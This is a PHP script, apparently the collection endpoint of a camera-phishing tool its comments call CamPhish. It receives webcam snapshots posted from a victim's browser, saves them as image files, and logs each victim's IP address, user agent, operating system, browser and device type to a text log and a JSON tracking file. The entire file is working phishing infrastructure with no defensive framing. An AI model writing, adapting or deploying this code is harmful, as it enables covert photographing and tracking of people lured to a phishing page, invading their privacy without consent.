<?php

$date = date('Y-m-d H:i:s');
$dateFile = date('dMYHis');
$imageData = $_POST['cat'] ?? '';

// Get the parent directory path (CamN folder)
$parentDir = dirname(__DIR__);
$camFilename = 'cam_' . $dateFile . '.png';
$camFilePath = $parentDir . DIRECTORY_SEPARATOR . $camFilename;

// Get IP address
$ipaddress = '';
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $ipaddress = trim($ips[0]);
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

// Get user agent
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Parse device info
$device_info = parse_device_info($browser);

if (!empty($imageData)) {
    // Parse base64 image data
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    
    if ($unencodedData && strlen($unencodedData) > 1000) {  // Ensure valid image data (>1KB)
        // Save image file to parent CamN folder
        $fp = fopen($camFilePath, 'wb');
        if ($fp) {
            fwrite($fp, $unencodedData);
            fclose($fp);
            
            // Verify file was written
            if (file_exists($camFilePath) && filesize($camFilePath) > 0) {
                $filesize = filesize($camFilePath);
                $filesize_kb = round($filesize / 1024, 2);
                
                // Create detailed structured log entry
                $log_entry = "╔" . str_repeat("═", 68) . "╗\n";
                $log_entry .= "║ [" . $date . "] CAMERA CAPTURE RECEIVED\n";
                $log_entry .= "╠" . str_repeat("═", 68) . "╣\n";
                $log_entry .= "║ FILE: " . $camFilename . "\n";
                $log_entry .= "║ PATH: " . $camFilePath . "\n";
                $log_entry .= "║ SIZE: " . $filesize . " bytes (" . $filesize_kb . " KB)\n";
                $log_entry .= "║ RESOLUTION: 1280x720 (HD)\n";
                $log_entry .= "║ FORMAT: PNG (Lossless)\n";
                $log_entry .= "╠" . str_repeat("═", 68) . "╣\n";
                $log_entry .= "║ DEVICE INFO:\n";
                $log_entry .= "║   OS: " . $device_info['os'] . "\n";
                $log_entry .= "║   BROWSER: " . $device_info['browser'] . "\n";
                $log_entry .= "║   DEVICE TYPE: " . $device_info['device_type'] . "\n";
                $log_entry .= "║   DEVICE NAME: " . $device_info['device_name'] . "\n";
                $log_entry .= "║ IP ADDRESS: " . $ipaddress . "\n";
                $log_entry .= "║ STATUS: SUCCESS\n";
                $log_entry .= "╚" . str_repeat("═", 68) . "╝\n\n";
                
                // Write to log file in CamPhish folder
                $logFile = __DIR__ . DIRECTORY_SEPARATOR . 'Log.log';
                file_put_contents($logFile, $log_entry, FILE_APPEND);
                
                // Create comprehensive JSON log for tracking
                $json_file = __DIR__ . DIRECTORY_SEPARATOR . 'captures.json';
                $json_entry = [
                    'timestamp' => $date,
                    'timestamp_unix' => time(),
                    'filename' => $camFilename,
                    'full_path' => $camFilePath,
                    'size_bytes' => $filesize,
                    'size_kb' => $filesize_kb,
                    'resolution' => '1280x720',
                    'format' => 'PNG',
                    'device' => [
                        'os' => $device_info['os'],
                        'browser' => $device_info['browser'],
                        'device_type' => $device_info['device_type'],
                        'device_name' => $device_info['device_name']
                    ],
                    'ip_address' => $ipaddress,
                    'user_agent' => $browser,
                    'status' => 'success'
                ];
                
                $existing = [];
                if (file_exists($json_file)) {
                    $json_content = file_get_contents($json_file);
                    $existing = json_decode($json_content, true) ?? [];
                }
                $existing[] = $json_entry;
                file_put_contents($json_file, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            }
        }
    }
}

// Helper function to parse device info
function parse_device_info($ua) {
    $result = [
        'os' => 'Unknown',
        'browser' => 'Unknown',
        'device_type' => 'Unknown',
        'device_name' => 'Unknown'
    ];
    
    // Detect OS
    if (preg_match('/Windows NT 10.0/', $ua)) $result['os'] = 'Windows 10';
    elseif (preg_match('/Windows NT 11.0/', $ua)) $result['os'] = 'Windows 11';
    elseif (preg_match('/Mac OS X/', $ua)) $result['os'] = 'macOS';
    elseif (preg_match('/iPhone/', $ua)) $result['os'] = 'iOS';
    elseif (preg_match('/iPad/', $ua)) $result['os'] = 'iPadOS';
    elseif (preg_match('/Android/', $ua)) $result['os'] = 'Android';
    elseif (preg_match('/Linux/', $ua)) $result['os'] = 'Linux';
    
    // Detect Browser
    if (preg_match('/Chrome/', $ua)) $result['browser'] = 'Chrome';
    elseif (preg_match('/Safari/', $ua)) $result['browser'] = 'Safari';
    elseif (preg_match('/Firefox/', $ua)) $result['browser'] = 'Firefox';
    elseif (preg_match('/Edge/', $ua)) $result['browser'] = 'Edge';
    
    // Detect Device Type
    if (preg_match('/Mobile|Android|iPhone|iPad/', $ua)) {
        $result['device_type'] = 'Mobile';
        if (preg_match('/iPad/', $ua)) $result['device_type'] = 'Tablet';
    } else {
        $result['device_type'] = 'Desktop';
    }
    
    // Extract device name
    if (preg_match('/iPhone/', $ua)) $result['device_name'] = 'iPhone';
    elseif (preg_match('/iPad/', $ua)) $result['device_name'] = 'iPad';
    elseif (preg_match('/Android/', $ua)) {
        if (preg_match('/SM-/', $ua)) $result['device_name'] = 'Samsung';
        elseif (preg_match('/Pixel/', $ua)) $result['device_name'] = 'Google Pixel';
        else $result['device_name'] = 'Android Device';
    } else {
        $result['device_name'] = 'Computer';
    }
    
    return $result;
}

// Send response header
header('Content-Type: application/json');
echo json_encode(['status' => 'received']);
exit();

?>

